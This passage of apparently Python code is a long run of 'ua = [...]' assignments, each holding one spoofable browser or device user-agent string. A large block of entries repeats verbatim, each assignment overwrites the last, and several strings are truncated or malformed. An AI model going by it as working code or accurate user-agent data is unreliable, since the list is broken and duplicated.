    'Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5']
ua = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0']
ua = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36']
ua = [
    'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36']
ua = [
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36']
ua = [
    'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.1.4322']
ua = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36']
ua = [
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36']
ua = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0']
ua = [
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36']
ua = [
    'Mozilla/5.0 (Windows IoT 10.0; Android 6.0.1; WebView/3.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Mobile Safari/537.36 Edge/17.17134']
ua = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.113 Safari/537.36']
ua = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0']
ua = [
    'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109']
ua = [
    'Mozilla/5.0 (iPhone; CPU iPhone OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4']
ua = [
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 3_1_3 like Mac OS X; en-us) AppleWebKit/528.18 (KHTML, like Gecko) Mobile/7E18 Safari/528.16.us3.3.37']
ua = [
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_3 like Mac OS X; es-es) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J2 Safari/6533.18.5']
ua = [
    'Mozilla/5.0 (iPhone; CPU iPhone OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Mobile/9A5313']
ua = [
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_3 like Mac OS X; es-es) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J2 Safari/6533.18.5']
ua = [
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1']
ua = [
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1']
ua = [
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1']
ua = [
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J2 Safari/6533.18.5']
ua = [
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8L1 Safari/6533.18.5']
ua = [
    'Mozilla/5.0 (Linux; Android 11; Redmi Note 8T Build/RKQ1.201004.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.70 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/372.1.0.23.107']
ua = [
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X)Android 3.1.4;F2Q4ET) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/103.0.5060.63 Mobile/15E148 Safari/604.170.2.1506.337']
ua = [
    'Mozilla/5.0 (Linux; Android 7.0; SM-G892A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 7.0; SM-G892A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 9; SM-G973U Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 10; SM-G980F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 11; Pixel 5 Build/RQ3A.210805.001.A1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.159 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 12; Pixel 6 Build/SD1A.210817.023; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.71 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 5.1.1; SM-G928X Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.83 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 6.0.1; SM-G935S Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 7.0; SM-G892A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 6.0.1; SM-G935S Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 9; J8110 Build/55.0.A.0.552; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 6.0.1; Nexus 6P Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.83 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 7.1.1; Google Pixel Build/NMF26F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/54.0.2840.85 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 8.0.0; Pixel 2 Build/OPD1.170811.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 6.0.1; E6653 Build/32.2.A.0.253) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 7.1.1; G8231 Build/41.2.A.0.219; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 6.0; HTC One X10 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.98 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 10; Wildfire U20 5G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 10; HTC Desire 21 pro 5G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (iPhone12,1; U; CPU iPhone OS 13_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/15E148 Safari/602.1']
ua = [
    'Mozilla/5.0 (iPhone13,2; U; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/15E148 Safari/602.1']
ua = [
    'Mozilla/5.0 (iPhone14,3; U; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/19A346 Safari/602.1']
ua = [
    'Mozilla/5.0 (iPhone14,6; U; CPU iPhone OS 15_4 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/19E241 Safari/602.1']
ua = [
    'Mozilla/5.0 (Linux; Android 11; Lenovo YT-J706X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 12; SM-X906C Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Microsoft; Lumia 950) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Mobile Safari/537.36 Edge/13.1058']
ua = [
    'Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Microsoft; RM-1127_16056) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Mobile Safari/537.36 Edge/12.10536']
ua = [
    'Mozilla/5.0 (iPhone12,1; U; CPU iPhone OS 13_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/15E148 Safari/602.1']
ua = [
    'Mozilla/5.0 (Linux; Android 5.0.2; LG-V410/V41020c Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/34.0.1847.118 Safari/537.36']
ua = [
    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:15.0) Gecko/20100101 Firefox/15.0.1']
ua = [
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36']
ua = [
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/601.3.9 (KHTML, like Gecko) Version/9.0.2 Safari/601.3.9']
ua = [
    'Mozilla/5.0 (X11; CrOS x86_64 8172.45.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.27 04.64 Safari/537.36']
ua = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246']
ua = [
    'Mozilla/5.0 (Linux; Android 9; AFTWMST22 Build/PS7233; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.152 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; U; Android 4.2.2; he-il; NEO-X5-116A Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30']
ua = [
    'Roku4640X/DVP-7.70 (297.70E04154']
ua = [
    'Mozilla/5.0 (CrKey armv7l 1.5.16041) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.0 Safari/537.36']
ua = [
    'Dalvik/2.1.0 (Linux; U; Android 9; ADT-2 Build/PTT5.181126.002']
ua = [
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 12_5_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.27']
ua = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.27']
ua = [
    'Mozilla/5.0 (Linux; Android 10; ONEPLUS A6003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.77 Mobile Safari/537.36 EdgA/100.0.1185.50']
ua = [
    'Mozilla/5.0 (Linux; Android 10; Pixel 3 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.77 Mobile Safari/537.36 EdgA/100.0.1185.50']
ua = [
    'Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.77 Mobile Safari/537.36 EdgA/100.0.1185.50']
ua = [
    'Mozilla/5.0 (Linux; Android 10; HD1913) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.77 Mobile Safari/537.36 EdgA/100.0.1185.50']
ua = [
    'Mozilla/5.0 (Windows Mobile 10; Android 10.0; Microsoft; Lumia 950XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36 Edge/40.15254.603']
ua = [
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 EdgiOS/100.1185.50 Mobile/15E148 Safari/605.1.15']
ua = [
    'Mozilla/5.0 (Linux; U; Android 6;  en-us; GT-T357H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4594.110 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 9; Huawei P20 Lite Build/PQ3A.190801.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.158 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 10; PPA-LX1; HMSCore 6.6.0.351) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.105 HuaweiBrowser/12.1.1.324 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 10; AGR-L09; HMSCore 6.6.0.351) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.105 HuaweiBrowser/12.1.1.324 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 10; POT-LX1; HMSCore 6.6.0.351; GMSCore 22.26.15) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.105 HuaweiBrowser/12.1.1.324 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 9; VKY-L09; HMSCore 6.6.0.351; GMSCore 22.26.15) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.105 HuaweiBrowser/12.1.1.324 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 10; JEF-NX9; HMSCore 6.4.0.312) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.105 HuaweiBrowser/12.0.3.314 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 9; INE-LX2; HMSCore 6.6.0.351; GMSCore 22.26.15) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.105 HuaweiBrowser/12.1.1.324 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 10; JNY-LX1; HMSCore 6.6.0.312) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.105 HuaweiBrowser/12.0.3.314 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 8.1.0; DUB-LX1; HMSCore 6.6.0.351; GMSCore 22.26.15) AppleWebKit/537.36  (KHTML, like Gecko) Chrome/92.0.4515.105 HuaweiBrowser/12.1.1.324 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 10; ELE-L04; HMSCore 6.6.0.352; GMSCore 22.26.15) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.105 HuaweiBrowser/12.1.1.324 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 10; MAR-LX1A; HMSCore 6.6.0.351; GMSCore 21.48.15) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.105 HuaweiBrowser/12.1.1.324 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (X11; U; Linux armv7l like Android; en-us) AppleWebKit/531.2+ (KHTML, like Gecko) Version/5.0 Safari/533.2+ Kindle/3.0+']
ua = [
    'Mozilla/5.0 (Nintendo Switch; WifiWebAuthApplet) AppleWebKit/601.6 (KHTML, like Gecko) NF/4.0.0.5.10 NintendoBrowser/5.1.0.13343']
ua = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; Xbox; Xbox Series X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.82 Safari/537.36 Edge/20.02']
ua = [
    'Mozilla/5.0 (Linux; Android 5.1; AFTS Build/LMY47O) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/41.99900.2250.0242 Safari/537.36']
ua = [
    'Mozilla/5.0 (iPhone; CPU iPhone OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4']
ua = [
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 3_1_3 like Mac OS X; en-us) AppleWebKit/528.18 (KHTML, like Gecko) Mobile/7E18 Safari/528.16.us3.3.37']
ua = [
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_3 like Mac OS X; es-es) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J2 Safari/6533.18.5']
ua = [
    'Mozilla/5.0 (iPhone; CPU iPhone OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Mobile/9A5313']
ua = [
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_3 like Mac OS X; es-es) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J2 Safari/6533.18.5']
ua = [
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1']
ua = [
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1']
ua = [
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1']
ua = [
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J2 Safari/6533.18.5']
ua = [
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8L1 Safari/6533.18.5']
ua = [
    'Mozilla/5.0 (Linux; Android 11; Redmi Note 8T Build/RKQ1.201004.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.70 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/372.1.0.23.107']
ua = [
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X)Android 3.1.4;F2Q4ET) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/103.0.5060.63 Mobile/15E148 Safari/604.170.2.1506.337']
ua = [
    'Mozilla/5.0 (Linux; Android 7.0; SM-G892A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 7.0; SM-G892A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 9; SM-G973U Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 10; SM-G980F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 11; Pixel 5 Build/RQ3A.210805.001.A1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.159 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 12; Pixel 6 Build/SD1A.210817.023; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.71 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 5.1.1; SM-G928X Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.83 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 6.0.1; SM-G935S Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 7.0; SM-G892A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 6.0.1; SM-G935S Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 9; J8110 Build/55.0.A.0.552; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 6.0.1; Nexus 6P Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.83 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 7.1.1; Google Pixel Build/NMF26F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/54.0.2840.85 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 8.0.0; Pixel 2 Build/OPD1.170811.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 6.0.1; E6653 Build/32.2.A.0.253) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 7.1.1; G8231 Build/41.2.A.0.219; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 6.0; HTC One X10 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.98 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 10; Wildfire U20 5G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 10; HTC Desire 21 pro 5G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (iPhone12,1; U; CPU iPhone OS 13_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/15E148 Safari/602.1']
ua = [
    'Mozilla/5.0 (iPhone13,2; U; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/15E148 Safari/602.1']
ua = [
    'Mozilla/5.0 (iPhone14,3; U; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/19A346 Safari/602.1']
ua = [
    'Mozilla/5.0 (iPhone14,6; U; CPU iPhone OS 15_4 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/19E241 Safari/602.1']
ua = [
    'Mozilla/5.0 (Linux; Android 11; Lenovo YT-J706X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 12; SM-X906C Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Microsoft; Lumia 950) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Mobile Safari/537.36 Edge/13.1058']
ua = [
    'Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Microsoft; RM-1127_16056) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Mobile Safari/537.36 Edge/12.10536']
ua = [
    'Mozilla/5.0 (iPhone12,1; U; CPU iPhone OS 13_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/15E148 Safari/602.1']
ua = [
    'Mozilla/5.0 (Linux; Android 5.0.2; LG-V410/V41020c Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/34.0.1847.118 Safari/537.36']
ua = [
    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:15.0) Gecko/20100101 Firefox/15.0.1']
ua = [
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36']
ua = [
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/601.3.9 (KHTML, like Gecko) Version/9.0.2 Safari/601.3.9']
ua = [
    'Mozilla/5.0 (X11; CrOS x86_64 8172.45.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.27 04.64 Safari/537.36']
ua = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246']
ua = [
    'Mozilla/5.0 (Linux; Android 9; AFTWMST22 Build/PS7233; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.152 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; U; Android 4.2.2; he-il; NEO-X5-116A Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30']
ua = [
    'Roku4640X/DVP-7.70 (297.70E04154']
ua = [
    'Mozilla/5.0 (CrKey armv7l 1.5.16041) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.0 Safari/537.36']
ua = [
    'Dalvik/2.1.0 (Linux; U; Android 9; ADT-2 Build/PTT5.181126.002']
ua = [
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 12_5_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.27']
ua = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.27']
ua = [
    'Mozilla/5.0 (Linux; Android 10; ONEPLUS A6003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.77 Mobile Safari/537.36 EdgA/100.0.1185.50']
ua = [
    'Mozilla/5.0 (Linux; Android 10; Pixel 3 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.77 Mobile Safari/537.36 EdgA/100.0.1185.50']
ua = [
